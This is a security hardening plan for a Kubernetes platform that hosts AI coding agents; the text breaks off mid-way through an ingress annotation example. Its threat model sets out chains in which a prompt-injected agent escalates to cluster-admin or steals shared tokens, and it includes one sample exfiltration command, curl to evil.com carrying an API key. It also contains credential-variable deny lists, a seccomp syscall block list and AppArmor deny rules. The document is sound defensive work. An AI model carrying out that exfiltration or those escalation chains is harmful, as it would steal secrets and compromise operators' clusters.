# KubeSynapse Security Hardening Plan

**Created:** 2026-05-19  
**Status:** Active  
**Based on:** [OpenCode Runtime Audit](opencode-security-audit.md) | [Pi Runtime Audit](pi-security-audit.md) | [Platform Audit](kubesynapse-platform-security-audit.md)  
**Scope:** Full-stack hardening — Helm chart, operator, API gateway, MCP sidecars, and runtime isolation for OpenCode & Pi agents  

---

## Table of Contents

1. [Threat Model Summary](#threat-model-summary)
2. [Design Principles](#design-principles)
3. [Workstream 1: Platform Infrastructure](#workstream-1-platform-infrastructure-hardening)
4. [Workstream 2: MCP Sidecar Security](#workstream-2-mcp-sidecar-authentication--isolation)
5. [Workstream 3: Runtime Isolation](#workstream-3-runtime-isolation-platform-enforced-sandboxing)
6. [Workstream 4: API Gateway Hardening](#workstream-4-api-gateway-hardening)
7. [Workstream 5: Admission & Validation](#workstream-5-admission-webhooks--crd-validation)
8. [Cross-Cutting Concerns](#cross-cutting-concerns)
9. [Implementation Schedule](#implementation-schedule)
10. [Decision Log](#decision-log)
11. [Verification Checklist](#verification-checklist)
12. [Attack Chain Mitigations](#attack-chain-mitigations)

---

## Threat Model Summary

### Primary Threat Actors

| Actor | Capability | Goal |
|-------|-----------|------|
| **Compromised Agent (prompt injection)** | Code execution via bash/code-exec tools, access to pod env vars and network | Lateral movement, credential theft, cluster escalation |
| **Malicious Tenant** | Can create AIAgent CRDs with attacker-controlled configs | Privilege escalation, cross-tenant data access |
| **Network Attacker** | Can sniff unencrypted traffic, MITM ingress | Session hijacking, credential theft |
| **Supply Chain Attacker** | Can compromise upstream images, npm packages, git repos | Persistent backdoor in runtime/sidecar containers |
| **Insider with Helm Access** | Can read `values.yaml`, Helm history, CI/CD logs | Full platform compromise via exposed secrets |

### Critical Attack Chains (from audit)

```
Chain 1: Prompt Injection -> Agent Code Exec -> Operator SA Token -> ClusterRoleBinding -> cluster-admin
Chain 2: Compromised Agent -> MCP Sidecar (no auth) -> code-exec (no egress) -> Exfiltrate shared MCP token -> All Agents
Chain 3: Helm Values Leak -> JWT Secret -> Forge Admin Tokens -> Full Platform Access
Chain 4: No Redis/NATS Auth -> Session Data Manipulation -> Unauthorized Agent Actions
Chain 5: No TLS on Ingress -> Sniff Cookies/Tokens -> Session Hijacking
```

### Aggregate Findings

| Source | CRITICAL | HIGH | MEDIUM | LOW | Total |
|--------|----------|------|--------|-----|-------|
| OpenCode Runtime | 7 | 8 | 7 | 1 | 23 |
| Pi Runtime | 7 | 4 | 3 | 1 | 15 |
| KubeSynapse Platform | 6 | 17 | 26 | 25 | 74 |
| **Combined** | **20** | **29** | **36** | **27** | **112** |

---

## Design Principles

1. **Zero Trust Between Components** — Every service authenticates to every other service. No implicit trust based on network adjacency.
2. **Fail Secure** — Missing credentials cause hard failures, not silent fallbacks.
3. **Platform Enforces, Runtime Cannot Override** — Runtimes (OpenCode, Pi) are untrusted. All security boundaries are enforced at the Kubernetes/platform level.
4. **Minimal Environment** — Runtime pods receive only the environment variables they strictly need. Everything else is stripped.
5. **Immutable Config** — Runtime configuration is mounted read-only. The runtime cannot modify its own config, install plugins, or load extensions.
6. **Least Privilege RBAC** — Each component has its own ServiceAccount with the minimum permissions required. No shared SAs between operator and workers.
7. **Defense in Depth** — Multiple layers (NetworkPolicy + egress iptables + application-layer checks + seccomp) protect the same boundary.
8. **Secrets Never in Manifests** — Production deployments use External Secrets Operator with Vault/AWS SM/Azure KV. Native mode exists only for development.

---

## Workstream 1: Platform Infrastructure Hardening

### Phase 1A — Credential & Authentication Gaps

**Priority:** CRITICAL  
**Timeline:** Week 1  
**Risk if unaddressed:** Complete platform compromise via unauthenticated data stores  

#### 1A.1 Redis Authentication

**Finding:** Redis deployed with NO `--requirepass`. Any pod on the network can read/write all keys.  
**File:** `charts/kubesynapse/templates/redis.yaml:48`

**Implementation:**

- [ ] Add `redis.auth.password` to `values.yaml` (empty string = auto-generate)
- [ ] Add `redis.auth.existingSecret` and `redis.auth.existingSecretKey` for ExternalSecret integration
- [ ] Update `redis.yaml` template:
  - Add `--requirepass $(REDIS_PASSWORD)` to Redis args
  - Mount password from secret as env var
  - Update health probes to use `redis-cli -a $(REDIS_PASSWORD) ping`
- [ ] Create auto-generated Redis auth secret (preserved via `lookup` on upgrades)
- [ ] Update `litellm-configmap.yaml`: add `password` field to `cache_params`
- [ ] Update `api-gateway.yaml`: add `REDIS_URL` env var with password in connection string
- [ ] Update `external-secrets.yaml`: add `REDIS_PASSWORD` key

**Verification:**
```bash
# After deployment, verify Redis rejects unauthenticated connections:
kubectl exec -it $(kubectl get pod -l app=redis -o name) -- redis-cli ping
# Should return: NOAUTH Authentication required.
```

#### 1A.2 NATS Authentication

**Finding:** NATS deployed with no `--auth` or `--user/--pass`. Any pod can publish/subscribe.  
**File:** `charts/kubesynapse/templates/nats.yaml:50`

**Implementation:**

- [ ] Add `nats.auth.token` to `values.yaml` (empty = auto-generate)
- [ ] Add `nats.auth.existingSecret` and `nats.auth.existingSecretKey` for ExternalSecret integration
- [ ] Update `nats.yaml` template:
  - Add `--auth $(NATS_TOKEN)` to NATS args
  - Mount token from secret as env var
- [ ] Create auto-generated NATS auth secret (preserved via `lookup` on upgrades)
- [ ] Update `api-gateway.yaml`: change `NATS_URL` to include token: `nats://<token>@<host>:4222`
- [ ] Update `operator-deployment.yaml`: same NATS_URL update for operator
- [ ] Update `external-secrets.yaml`: add `NATS_TOKEN` key

**Verification:**
```bash
# Verify NATS rejects unauthenticated connections:
kubectl exec -it $(kubectl get pod -l app=nats -o name) -- \
  wget -qO- http://localhost:8222/connz
# Should show 0 unauthorized connections
```

#### 1A.3 JWT_SECRET Fail-Secure

**Finding:** Gateway generates ephemeral random key if JWT_SECRET is empty. Sessions don't survive restarts but system runs insecurely.  
**File:** `api-gateway/jwt_utils.py:61-71`

**Implementation:**

- [ ] Add `REQUIRE_JWT_SECRET=true` env var to api-gateway deployment template
- [ ] The existing code at `jwt_utils.py:70-71` already exits when `REQUIRE_JWT_SECRET` is enabled
- [ ] This is a zero-code-change fix — just wire the env var in the Helm template

**Verification:**
```bash
# Deploy without JWT_SECRET set — pod should CrashLoopBackOff with FATAL log:
kubectl logs $(kubectl get pod -l app=api-gateway -o name) | grep "FATAL"
```

#### 1A.4 Cookie Security Defaults

**Finding:** `cookieSecure: false` sends auth cookies over HTTP.  
**File:** `charts/kubesynapse/values.yaml:226`

**Implementation:**

- [ ] Change `cookieSecure: false` to `cookieSecure: true` in `values.yaml`
- [ ] Add chart-level warning when `ingress.enabled=true && tls.enabled=false && cookieSecure=true` (the cookie won't be sent over HTTP — this catches misconfig)

#### 1A.5 TLS Enforcement

**Finding:** Ingress TLS disabled by default. All traffic including tokens travels in cleartext.  
**File:** `charts/kubesynapse/values.yaml:216-218`

**Implementation:**

- [ ] Add `tls.allowInsecure: false` to values.yaml
- [ ] Add template validation: if `ingress.enabled=true && tls.enabled=false && tls.allowInsecure=false`, fail with a clear error message
- [ ] Document that `tls.allowInsecure: true` must be explicitly set for HTTP-only deployments (dev/local)
- [ ] Add security header annotations to the Ingress resource:
  ```yaml
  nginx.ingress.kubernetes.io/force-ssl-redirect: "true"
  nginx.ingress.kubernetes.io/configuration-snippet: |
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  ```

---

### Phase 1B — RBAC Escalation Paths

**Priority:** CRITICAL  
**Timeline:** Week 1-2  
**Risk if unaddressed:** Compromised operator/worker can escalate to cluster-admin  

#### 1B.1 Operator ClusterRoleBinding Escalation

**Finding:** Operator could create ClusterRoleBindings granting itself cluster-admin.  
**File:** `charts/kubesynapse/templates/operator-rbac.yaml:85-87`

**Current state:** Already fixed in current RBAC file (line 85-87 now shows only `roles, rolebindings` not `clusterroles, clusterrolebindings`).

- [x] Verify `clusterrolebindings` create permission is removed (**DONE** — current file shows only `roles, rolebindings`)

#### 1B.2 Scope Operator Secret Access

**Finding:** Operator has `secrets: [create, get, patch, update]` cluster-wide.  
**File:** `charts/kubesynapse/templates/operator-rbac.yaml:112-114`

**Implementation:**

- [ ] ClusterRole: Change `secrets` verbs to `[get]` only (needed for reading MCP auth secret from hub namespace)
- [ ] Add namespace-scoped Roles (created by tenant controller) with `secrets: [create, patch, update]` for each tenant namespace
- [ ] Operator's local Role already has `secrets: [list, delete]` — add `[create, patch, update]` here for operator namespace operations

**Impact analysis:**
- The operator creates secrets in tenant namespaces during agent bootstrap (`create_mcp_auth_secret_manifest`)
- The operator patches secrets when rotating MCP tokens
- These operations should use namespace-scoped Roles created alongside the tenant namespace

#### 1B.3 Dedicated Worker ServiceAccount

**Finding:** Worker jobs inherit operator's cluster-wide SA.  
**File:** `charts/kubesynapse/templates/operator-deployment.yaml:165`

**Implementation:**

- [ ] Create new `kubesynapse-worker-sa` ServiceAccount in `operator-rbac.yaml`
- [ ] Create ClusterRole `kubesynapse-worker-role` with minimal permissions:
  ```yaml
  rules:
    - apiGroups: ["kubesynapse.ai"]
      resources: [aiagents/status, agentworkflows/status]
      verbs: [get, patch]
    - apiGroups: [""]
      resources: [pods/log]
      verbs: [get]
    - apiGroups: [""]
      resources: [persistentvolumeclaims]
      verbs: [get, list]
    - apiGroups: [""]
      resources: [configmaps]
      verbs: [get, create, patch]
  ```
- [ ] Update `WORKER_SERVICE_ACCOUNT_NAME` in operator deployment to use new SA
- [ ] Update `operator/builders/manifests.py` to use the new SA name

#### 1B.4 Remove Tenant pods/exec

**Finding:** Tenant RBAC grants `pods/exec` and `pods/portforward`.  
**File:** `operator/controllers/tenant_controller.py:163-167`

**Implementation:**

- [ ] Add `agentRuntime.tenantExecAccess: false` to `values.yaml`
- [ ] Update `tenant_controller.py`: when `tenantExecAccess=false`, exclude `pods/exec` and `pods/portforward` from tenant admin Role
- [ ] Default to disabled; operators who need exec can opt-in explicitly

---

### Phase 1C — Network & Egress Tightening

**Priority:** HIGH  
**Timeline:** Week 2  
**Risk if unaddressed:** Compromised pods can exfiltrate data to arbitrary destinations  

#### 1C.1 Narrow Kubernetes API Egress CIDR

**Finding:** Agent egress allows `0.0.0.0/0` on ports 443/6443.  
**File:** `charts/kubesynapse/templates/agent-network-policy.yaml:57-64`

**Implementation:**

- [ ] Add `agentRuntime.kubeApiCidr: ""` to `values.yaml` (empty = use `networkPolicy.clusterApiCidr`)
- [ ] Update `agent-network-policy.yaml` to use the narrowed CIDR
- [ ] Document that users should set this to their actual K8s API server CIDR (discoverable via `kubectl cluster-info`)
- [ ] Change default `networkPolicy.clusterApiCidr` from `0.0.0.0/0` to require explicit override on production installs

#### 1C.2 Egress Deny-All for Data Stores

**Finding:** Redis, NATS, Qdrant have no egress restrictions — if compromised they can exfiltrate data.  
**Files:** `redis.yaml`, `nats.yaml`, `qdrant.yaml`

**Implementation:**

- [ ] Add `policyTypes: [Ingress, Egress]` to existing NetworkPolicies for Redis, NATS, Qdrant
- [ ] Add empty `egress: []` (deny all outbound) — these services should never initiate connections
- [ ] Exception: Allow DNS (UDP/TCP 53) in case of DNS-based health checks

#### 1C.3 NATS Monitoring Port Hardening

**Finding:** NATS monitoring port (8222) exposed in Service, leaks connection info.  
**File:** `charts/kubesynapse/templates/nats.yaml:100-103`

**Implementation:**

- [ ] Remove port 8222 from the Service spec (keep it only for pod-level probes)
- [ ] Probes already use `httpGet` to pod port directly — Service exposure is unnecessary
- [ ] If monitoring access is needed, add a dedicated monitoring Service with NetworkPolicy restricting to Prometheus namespace only

---

## Workstream 2: MCP Sidecar Authentication & Isolation

### Phase 2A — Bearer Token Enforcement

**Priority:** CRITICAL  
**Timeline:** Week 1  
**Risk if unaddressed:** Any pod on the network can call MCP tools without authentication (lateral movement)  

#### 2A.1 Wire verify_bearer_token() into FastMCP

**Finding:** `verify_bearer_token()` is defined but never called.  
**File:** `mcp-sidecars/base/mcp_base.py:168`

**Implementation:**

- [ ] Add HTTP middleware to the FastMCP streamable-HTTP transport that:
  1. Extracts `Authorization: Bearer <token>` from inbound requests
  2. Calls `verify_bearer_token(token)`
  3. Returns HTTP 401 `{"error": "unauthorized"}` if invalid
  4. Exempts `/healthz` and `/readyz` endpoints (probes don't carry tokens)
- [ ] Update `create_mcp_server()` to apply the middleware before `run_server()`
- [ ] Fail-secure: if `MCP_BEARER_TOKEN` env var is empty, deny ALL requests (already implemented in `verify_bearer_token()` — it returns `False` when token not configured)

**Code sketch:**
```python
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import JSONResponse

class BearerAuthMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        if request.url.path in ("/healthz", "/readyz"):
            return await call_next(request)
        auth_header = request.headers.get("authorization", "")
        token = auth_header.removeprefix("Bearer ").strip() if auth_header.startswith("Bearer ") else ""
        if not verify_bearer_token(token):
            return JSONResponse({"error": "unauthorized"}, status_code=401)
        return await call_next(request)
```

**Verification:**
```bash
# Call MCP server without token — should get 401:
kubectl exec -it <agent-pod> -c mcp-code-exec -- \
  curl -s http://localhost:8090/mcp -d '{"method":"tools/list"}' | grep 401

# Call with valid token — should succeed:
kubectl exec -it <agent-pod> -c mcp-code-exec -- \
  curl -s -H "Authorization: Bearer $MCP_BEARER_TOKEN" http://localhost:8090/mcp
```

#### 2A.2 MCP Hub Bearer Token Validation

**Finding:** Default bearer token is `REPLACE-WITH-STRONG-SECRET`.  
**File:** `charts/kubesynapse/templates/mcp-server-deployment.yaml:35`

**Implementation:**

- [ ] Add `required` check: if `mcpHub.auth.bearerToken` is empty AND `mcpHub.auth.secretName` is empty, fail with a clear error
- [ ] Remove the fallback default string `REPLACE-WITH-STRONG-SECRET`
- [ ] Add Helm chart helper to auto-generate a 48-byte random token on first install (preserve via `lookup` on upgrade)
- [ ] Document: for production, use ExternalSecret to inject the token

---

### Phase 2B — Code-Exec Hardening

**Priority:** CRITICAL  
**Timeline:** Week 1  
**Risk if unaddressed:** Arbitrary code execution with unrestricted network access enables full data exfiltration  

#### 2B.1 Application-Layer Egress Deny

**Finding:** `code-exec/capabilities.json` has empty domain/IP allowlists, which the current logic interprets as "permit all".  
**File:** `mcp-sidecars/code-exec/capabilities.json:6-7`

**Implementation:**

- [ ] Change `mcp_base.py` `check_egress_url()` behavior: when `allowed_domains` and `allowed_cidrs` are BOTH empty, **deny** (not permit). This is a semantic inversion that makes empty = deny.
- [ ] OR: Set explicit deny marker in capabilities.json:
  ```json
  {
    "networkEgress": {
      "mode": "deny-all",
      "domains": [],
      "ips": []
    }
  }
  ```
- [ ] Update `check_egress_url()` to check for `"mode": "deny-all"`
- [ ] For code-exec specifically: there is no legitimate reason for executed code to make network calls. All LLM access goes through the runtime, not the sidecar.

#### 2B.2 Network-Layer Egress for Code-Exec

**Finding:** The `sidecar-egress-init` container already exists for iptables-based egress restriction.  
**File:** `operator/builders/manifests.py:715-737`

**Implementation:**

- [ ] Ensure code-exec sidecar is always launched with the egress init container
- [ ] The init container should set rules: allow loopback + DNS only, DROP all else
- [ ] This provides defense-in-depth even if the application-layer check is bypassed
- [ ] Verify the init container is applied when an agent has `code-exec` in its MCP tool list

#### 2B.3 Web-Search and Browser Egress

**Finding:** `web-search` and `browser` sidecars have `"domains": ["*"]` — permit all.  
**Files:** `mcp-sidecars/web-search/capabilities.json`, `mcp-sidecars/browser/capabilities.json`

**Implementation:**

- [ ] Replace `["*"]` with curated domain allowlists:
  - **web-search**: `["*.google.com", "*.bing.com", "*.duckduckgo.com", "api.exa.ai", "*.tavily.com"]`
  - **browser**: Make configurable per-agent via CRD field `spec.mcpConnections[].egressDomains`
- [ ] Add internal network blocking: reject any URL resolving to RFC 1918/RFC 4193 addresses (SSRF protection)
- [ ] Add redirect following protection: cap redirects at 3, validate each hop against allowlist

---

### Phase 2C — Supply Chain

**Priority:** HIGH  
**Timeline:** Week 3  
**Risk if unaddressed:** Compromised upstream images backdoor all deployments  

#### 2C.1 Pin Base Images to Digests

**Finding:** All MCP Dockerfiles use floating `python:3.11-slim` tag.  
**Files:** All `mcp-sidecars/*/Dockerfile`

**Implementation:**

- [ ] Pin base images: `FROM python:3.11-slim@sha256:<digest>`
- [ ] Create CI job that checks for base image updates weekly and opens PRs
- [ ] Add `--require-hashes` to all `pip install` commands
- [ ] Generate `requirements.lock` files with hashes for each sidecar

#### 2C.2 kubectl Checksum Verification

**Finding:** `github-adapter/Dockerfile` downloads kubectl without checksum.  
**File:** `mcp-sidecars/github-adapter/Dockerfile`

**Implementation:**

- [ ] Pin kubectl to specific version (e.g., `v1.30.2`)
- [ ] Download checksum file and verify: `sha256sum --check`
- [ ] Example:
  ```dockerfile
  ARG KUBECTL_VERSION=v1.30.2
  RUN curl -LO "https://dl.k8s.io/release/${KUBECTL_VERSION}/bin/linux/amd64/kubectl" && \
      curl -LO "https://dl.k8s.io/release/${KUBECTL_VERSION}/bin/linux/amd64/kubectl.sha256" && \
      echo "$(cat kubectl.sha256)  kubectl" | sha256sum --check && \
      install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
  ```

#### 2C.3 Migration Job Image Pinning

**Finding:** `pvc-retention-migration-job.yaml` uses `bitnami/kubectl:latest`.  
**File:** `charts/kubesynapse/templates/pvc-retention-migration-job.yaml:34`

**Implementation:**

- [ ] Pin to specific tag: `bitnami/kubectl:1.30`
- [ ] Add digest pinning for production: `bitnami/kubectl@sha256:<digest>`

---

## Workstream 3: Runtime Isolation (Platform-Enforced Sandboxing)

### Core Principle

> Both OpenCode and Pi have **ZERO sandboxing**. Every tool execution runs with full user privileges, full filesystem access, full network access, and full environment variable inheritance. The platform MUST enforce all isolation boundaries externally.

### Phase 3A — Environment Variable Isolation

**Priority:** CRITICAL  
**Timeline:** Week 1  
**Risk if unaddressed:** Prompt injection -> bash tool -> `curl evil.com?key=$ANTHROPIC_API_KEY`  

#### 3A.1 Explicit Env Var Allowlist (Pod Spec)

**Finding:** Both runtimes leak full `process.env` to child processes including all API keys.  
**Files:** OpenCode `tool/shell.ts:419-420`, Pi `utils/shell.ts:112-124`

**Implementation:**

- [ ] Modify `operator/builders/manifests.py` to build runtime container `env` as an explicit allowlist:

  ```python
  RUNTIME_SAFE_ENV = [
      "HOME", "PATH", "USER", "LANG", "LC_ALL", "TERM",
      "TMPDIR", "HOSTNAME", "POD_NAMESPACE", "POD_NAME",
      # Runtime-specific (exactly one LLM key)
      "ANTHROPIC_API_KEY",  # or OPENAI_API_KEY depending on provider
      # Internal platform URLs
      "LITELLM_INTERNAL_URL", "MCP_BEARER_TOKEN",
      "QDRANT_URL",
  ]
  ```

- [ ] Never use `envFrom` for runtime containers
- [ ] Explicitly do NOT pass:
  - `OPENCODE_CONFIG_CONTENT` (allows full config injection)
  - `OPENCODE_PERMISSION` (overrides all permission rules)
  - `OPENCODE_CONFIG_DIR`, `OPENCODE_CONFIG` (redirects config loading)
  - `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`
  - `GCP_CREDENTIALS`, `GOOGLE_APPLICATION_CREDENTIALS`
  - `AZURE_CLIENT_SECRET`, `AZURE_TENANT_ID`
  - `DOCKER_HOST`, `KUBECONFIG`
  - `DATABASE_URL`, `DATABASE_PASSWORD`
  - `JWT_SECRET`, `API_GATEWAY_SHARED_TOKEN`

**Verification:**
```bash
# Exec into runtime container and verify minimal env:
kubectl exec -it <agent-pod> -c runtime -- env | sort
# Should show only ~10-15 vars, NOT any *_SECRET or *_KEY vars beyond the single LLM key
```

#### 3A.2 Single API Key Per Agent

**Finding:** Both runtimes can access any API key in the environment.

**Implementation:**

- [ ] The operator already selects which LLM provider key to inject based on `spec.provider`
- [ ] Verify: only ONE of `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, etc. is injected per agent
- [ ] If using LiteLLM as proxy: inject only `LITELLM_INTERNAL_URL` + `LITELLM_API_KEY` (internal key), never direct provider keys

---

### Phase 3B — Immutable Configuration

**Priority:** HIGH  
**Timeline:** Week 2  
**Risk if unaddressed:** Attacker writes malicious config -> next agent restart loads plugins/extensions -> persistent RCE  

#### 3B.1 OpenCode Hardened Config

**Finding:** Config-driven RCE via plugins, MCP server commands, provider baseURL redirect.  
**Files:** OpenCode `config/config.ts`, `plugin/loader.ts`, `mcp/index.ts`

**Implementation:**

- [ ] Create ConfigMap template `charts/kubesynapse/templates/opencode-safe-config.yaml`:
  ```json
  {
    "plugin": [],
    "permission": {
      "bash": "ask",
      "external_directory": "deny",
      "edit": "ask",
      "write": "ask",
      "webfetch": "deny",
      "websearch": "deny"
    },
    "mcp": {},
    "skills": { "urls": [] },
    "provider": {}
  }
  ```
- [ ] Mount as read-only at `/etc/kubesynapse/opencode.json` in the runtime container
- [ ] Set `OPENCODE_CONFIG=/etc/kubesynapse/opencode.json` in pod spec
- [ ] Ensure `readOnlyRootFilesystem: true` prevents the runtime from writing its own config files to `.opencode/`

#### 3B.2 Pi Hardened Config

**Finding:** Pi loads extensions via `jiti.import()`, replaces system prompt via `SYSTEM.md`, executes shell via `!` config prefix.  
**Files:** Pi `extensions/loader.ts`, `resource-loader.ts`, `resolve-config-value.ts`

**Implementation:**

- [ ] Create ConfigMap template `charts/kubesynapse/templates/pi-safe-config.yaml`:
  ```json
  {
    "extensions": [],
    "packages": [],
    "permissionLevel": "strict",
    "models": {}
  }
  ```
- [ ] Mount as read-only at `/etc/kubesynapse/pi-config/` in the runtime container
- [ ] Mount empty read-only directories at:
  - `/home/agent/.pi/agent/extensions/` (blocks extension discovery)
  - `/home/agent/.pi/agent/skills/` (blocks SKILL.md injection)
- [ ] Do NOT create `SYSTEM.md` or `APPEND_SYSTEM.md` anywhere in mounted paths
- [ ] Set `PI_CONFIG_DIR=/etc/kubesynapse/pi-config` in pod spec
- [ ] Verify that pi's config resolution respects `PI_CONFIG_DIR` over CWD discovery

#### 3B.3 Operator CRD Validation (Pre-Webhook)

**Finding:** Malicious AIAgent CRDs can contain `!`-prefix values, plugin declarations, or arbitrary MCP commands.

**Implementation:**

- [ ] In `operator/controllers/agent_controller.py` reconciler, add validation before building manifests:
  - Reject any `env` value starting with `!` (Pi config RCE)
  - Reject any `configFiles` entry containing `"plugin"` key with non-empty array (OpenCode RCE)
  - Reject any `mcpConnections[].command` not in the platform allowlist
  - Log rejected agents with severity CRITICAL
- [ ] Set agent status to `Failed` with clear error message explaining why

---

### Phase 3C — Filesystem & Kernel Isolation

**Priority:** HIGH  
**Timeline:** Week 2-3  
**Risk if unaddressed:** Agent writes to ~/.bashrc, ~/.ssh/authorized_keys, .git/hooks, etc.  

#### 3C.1 Read-Only Root + PVC-Only Writes

**Finding:** Both runtimes can write to any absolute path.

**Current state:** `readOnlyRootFilesystem: true` is already set. PVC is mounted at `/workspace`.

**Implementation:**

- [ ] Verify that the ONLY writable mount in the runtime container is:
  - `/workspace` (PVC — agent working directory)
  - `/tmp` (emptyDir — temporary files)
- [ ] Set `HOME=/workspace/.home` (writable within PVC, not system-wide)
- [ ] Prevent the agent from writing outside the PVC by ensuring no `emptyDir` is mounted at sensitive paths

#### 3C.2 Seccomp Profile

**Finding:** Only `RuntimeDefault` seccomp profile is applied. Dangerous syscalls still allowed.

**Implementation:**

- [ ] Create custom seccomp profile `charts/kubesynapse/files/agent-seccomp.json`:
  ```json
  {
    "defaultAction": "SCMP_ACT_ERRNO",
    "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_AARCH64"],
    "syscalls": [
      {
        "names": ["ptrace", "mount", "umount2", "setuid", "setgid",
                  "chroot", "pivot_root", "unshare", "bpf",
                  "kexec_load", "perf_event_open", "userfaultfd",
                  "add_key", "request_key", "keyctl",
                  "init_module", "finit_module", "delete_module"],
        "action": "SCMP_ACT_ERRNO",
        "errnoRet": 1
      },
      {
        "names": ["read", "write", "open", "close", "stat", "fstat",
                  "lstat", "poll", "lseek", "mmap", "mprotect", "munmap",
                  "brk", "ioctl", "access", "pipe", "select", "sched_yield",
                  "dup", "dup2", "pause", "nanosleep", "getpid", "socket",
                  "connect", "accept", "sendto", "recvfrom", "bind", "listen",
                  "clone", "fork", "vfork", "execve", "exit", "wait4",
                  "kill", "fcntl", "flock", "fsync", "fdatasync",
                  "truncate", "ftruncate", "getdents", "getcwd", "chdir",
                  "rename", "mkdir", "rmdir", "creat", "link", "unlink",
                  "symlink", "readlink", "chmod", "fchmod", "chown", "fchown",
                  "gettimeofday", "getrlimit", "getuid", "getgid",
                  "geteuid", "getegid", "getppid", "getpgrp",
                  "setsid", "setpgid", "getgroups", "setgroups",
                  "sigaction", "sigprocmask", "sigreturn",
                  "futex", "epoll_create", "epoll_ctl", "epoll_wait",
                  "clock_gettime", "clock_getres", "exit_group",
                  "openat", "mkdirat", "fstatat", "unlinkat", "renameat",
                  "readlinkat", "fchmodat", "faccessat",
                  "epoll_create1", "pipe2", "dup3", "accept4",
                  "eventfd2", "timerfd_create", "timerfd_settime",
                  "signalfd4", "pread64", "pwrite64", "sendmsg", "recvmsg",
                  "getrandom", "memfd_create", "copy_file_range",
                  "statx", "io_uring_setup", "io_uring_enter",
                  "io_uring_register", "clone3", "close_range",
                  "openat2", "pidfd_open", "faccessat2"],
        "action": "SCMP_ACT_ALLOW"
      }
    ]
  }
  ```
- [ ] Deploy as `SeccompProfile` or `localhost` profile
- [ ] Apply to runtime containers: `securityContext.seccompProfile.type: Localhost`
- [ ] Add `agentRuntime.seccompProfile: "RuntimeDefault"` value (default), with option to set to custom profile path

#### 3C.3 AppArmor Profile (Optional — Tier 3)

**Implementation:**

- [ ] Create AppArmor profile `kubesynapse-runtime`:
  ```
  #include <tunables/global>
  profile kubesynapse-runtime flags=(attach_disconnected) {
    #include <abstractions/base>
    /workspace/** rw,
    /tmp/** rw,
    /proc/self/environ r,
    deny /etc/shadow r,
    deny /root/** rw,
    deny /**/.ssh/** rw,
    deny /**/.bashrc w,
    deny /**/.profile w,
    deny /**/.git/hooks/** w,
    deny /**/.vscode/** w,
  }
  ```
- [ ] Apply via pod annotation: `container.apparmor.security.beta.kubernetes.io/runtime: localhost/kubesynapse-runtime`
- [ ] Add values toggle: `agentRuntime.appArmorProfile: ""`

---

### Phase 3D — gVisor Sandbox (Tier 3 — Optional)

**Priority:** MEDIUM  
**Timeline:** Week 4+  
**Risk if unaddressed:** Kernel exploits can escape container namespace (unlikely but high-impact)  

**Implementation:**

- [ ] Add `agentRuntime.runtimeClassName: ""` to `values.yaml`
- [ ] When set (e.g., `gvisor`), operator adds `runtimeClassName` to agent pod spec
- [ ] Document: requires cluster-level gVisor installation (node-level RuntimeClass)
- [ ] Test: verify OpenCode/Pi function correctly under gVisor (some syscalls may be blocked)

---

## Workstream 4: API Gateway Hardening

### Phase 4A — Rate Limiting & Error Handling

**Priority:** HIGH  
**Timeline:** Week 2  

#### 4A.1 Redis-Backed Rate Limiting

**Finding:** In-memory rate limits are per-pod, easily bypassed in multi-pod deployments.  
**Files:** `api-gateway/auth_store.py:55-58`, `api-gateway/webhook_security.py:21-36`

**Implementation:**

- [ ] Add `redis-py` dependency to `requirements.txt`
- [ ] Create `api-gateway/rate_limiter.py` module with Redis INCR + EXPIRE pattern
- [ ] Replace `_LOGIN_ATTEMPTS` dict with Redis-backed counter
- [ ] Replace `_webhook_rate_state` dict with Redis-backed counter
- [ ] Add `REDIS_URL` env var to api-gateway deployment (already planned in Phase 1A)
- [ ] Fallback: if Redis is unreachable, use in-memory with WARNING log (don't fail open with no limiting)

#### 4A.2 Global API Rate Limiting

**Finding:** No global API rate limiting middleware.

**Implementation:**

- [ ] Add `slowapi` to `requirements.txt`
- [ ] Add rate limiting middleware to `main.py`:
  - Default: 100 requests/minute per IP for unauthenticated
  - Default: 1000 requests/minute per user for authenticated
  - Agent invocation: 30 requests/minute per agent
  - Chat session create: 10/minute per user
- [ ] Make limits configurable via env vars: `RATE_LIMIT_GLOBAL`, `RATE_LIMIT_INVOKE`, etc.

#### 4A.3 A2A Error Sanitization

**Finding:** JSON-RPC errors return `str(exc)` leaking internals.  
**File:** `api-gateway/routers/a2a.py:99-108`

**Implementation:**

- [ ] Replace `str(exc)` with generic `"Internal server error"` in the response
- [ ] Log the actual exception with traceback at `logger.exception()` level
- [ ] Return only the JSON-RPC error code and generic message to the caller

#### 4A.4 CORS Validation at Startup

**Finding:** `allow_credentials=True` combined with potentially misconfigured origins.  
**File:** `api-gateway/main.py:48-54`

**Implementation:**

- [ ] At startup, validate `API_GATEWAY_CORS_ORIGINS`:
  - If `*` is present AND `allow_credentials=True`, log CRITICAL and exit
  - If any origin contains a wildcard pattern with credentials, warn and sanitize

---

### Phase 4B — Dependency & Transport Security

**Priority:** MEDIUM  
**Timeline:** Week 3  

#### 4B.1 Dependency Upgrades

**Finding:** FastAPI 0.109, httpx 0.26, kubernetes 26 — all significantly outdated.

**Implementation:**

- [ ] Upgrade `fastapi` to 0.115+ (security patches, improved validation)
- [ ] Upgrade `httpx` to 0.28+ (connection pool fixes, TLS improvements)
- [ ] Upgrade `kubernetes` to 31+ (API compatibility, security patches)
- [ ] Upgrade `python-jose` to `PyJWT` (better maintained, smaller attack surface)
- [ ] Generate `requirements.lock` with `pip-tools compile --generate-hashes`
- [ ] Run full test suite after upgrade: `cd api-gateway && python -m pytest tests/ -v`

#### 4B.2 Ingress Security Headers

**Finding:** No security headers on API gateway Ingress.  
**File:** `charts/kubesynapse/templates/api-gateway.yaml:326-385`

**Implementation:**

- [ ] Add default annotations to the Ingress resource:
  ```yaml
  annotations:
    nginx.ingress.kubernetes.io/force-ssl-redirect: "{{ .Values.apiGateway.tls.enabled }}"
    nginx.ingress.kubernetes.io/server-snippets: |
      add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
